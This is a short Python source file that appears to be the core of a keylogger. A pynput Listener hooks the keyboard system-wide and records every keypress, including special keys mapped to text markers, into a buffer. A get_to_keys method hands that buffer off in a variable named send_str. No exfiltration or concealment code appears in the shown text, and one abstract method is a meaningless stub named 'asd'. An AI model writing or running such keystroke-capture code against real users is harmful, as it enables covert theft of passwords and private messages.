from typing import Any
from pynput.keyboard import Listener, Key, GlobalHotKeys
from abc import ABC, abstractmethod

class Logger(ABC):
    @abstractmethod
    def start(self) -> None:
        pass
    @abstractmethod
    def stop(self) -> None:
        pass
    @abstractmethod
    def get_to_keys(self) -> str:
        pass
    @abstractmethod
    def asd(self):
        pass

class MyListener(Logger):
    def __init__(self) -> None:
        self.listener = Listener(on_press=self.__on_press)
        self.temporary_typing_string = str()

    def start(self) -> None:
        self.listener.start()

    def stop(self) -> None:
        self.listener.stop()

    def get_to_keys(self) -> str:
        send_str = self.temporary_typing_string
        self.temporary_typing_string = str()
        return send_str
    
    def __on_press(self, key: Any) -> None:
        try:
            key = key.char
        except AttributeError:
            key = str(key)
            keys_dict = {
                "Key.alt": "(*alt*)",
                "Key.alt_l": "(*alt_l*)",
                "Key.alt_r": "(*alt_r*)",
                "Key.alt_gr": "(*alt_gr*)",
                "Key.backspace": "\b",
                "Key.caps_lock": "(*caps_lock*)",
                "Key.cmd": "(*cmd*)",
                "Key.cmd_l": "(*cmd_l*)",
                "Key.cmd_r": "(*cmd_r*)",
                "Key.ctrl": "(*ctrl*)",
                "Key.ctrl_l": "(*ctrl_l*)",
                "Key.ctrl_r": "(*ctrl_r*)",
                "Key.delete": "(*delete*)",
                "Key.down": "(*down*)",
                "Key.end": "(*end*)",
                "Key.enter": "\n",
                "Key.esc": "(*esc*)",
                "Key.f1": "(*f1*)",
                "Key.f2": "(*f2*)",
                "Key.f3": "(*f3*)",
                "Key.f4": "(*f4*)",
                "Key.f5": "(*f5*)",
                "Key.f6": "(*f6*)",
                "Key.f7": "(*f7*)",
                "Key.f8": "(*f8*)",
                "Key.f9": "(*f9*)",
                "Key.f10": "(*f10*)",
                "Key.f11": "(*f11*)",
                "Key.f12": "(*f12*)",
                "Key.f13": "(*f13*)",
                "Key.f14": "(*f14*)",
                "Key.f15": "(*f15*)",
                "Key.f16": "(*f16*)",
                "Key.f17": "(*f17*)",
                "Key.f18": "(*f18*)",
                "Key.f19": "(*f19*)",
                "Key.f20": "(*f20*)",
                "Key.home": "(*home*)",
                "Key.left": "(*left*)",
                "Key.page_down": "(*page_down*)",
                "Key.page_up": "(*page_up*)",
                "Key.right": "(*right*)",
                "Key.shift": "(*shift*)",
                "Key.shift_l": "(*shift_l*)",
                "Key.shift_r": "(*shift_r*)",
                "Key.space": " ",
                "Key.tab": "\t",
                "Key.up": "(*up*)",
                "Key.media_play_pause": "(*media_play_pause*)",
                "Key.media_volume_mute": "(*media_volume_mute*)",
                "Key.media_volume_down": "(*media_volume_down*)",
                "Key.media_volume_up": "(*media_volume_up*)",
                "Key.media_previous": "(*media_previous*)",
                "Key.media_next": "(*media_next*)",
                "Key.insert": "(*insert*)",
                "Key.menu": "(*menu*)",
                "Key.num_lock": "(*num_lock*)",
                "Key.pause": "(*pause*)",
                "Key.print_screen": "(*print_screen*)",
                "Key.scroll_lock": "(*scroll_lock*)"
                }
            if key in keys_dict:
                key = keys_dict[key]
        finally:
            self.temporary_typing_string += key
    
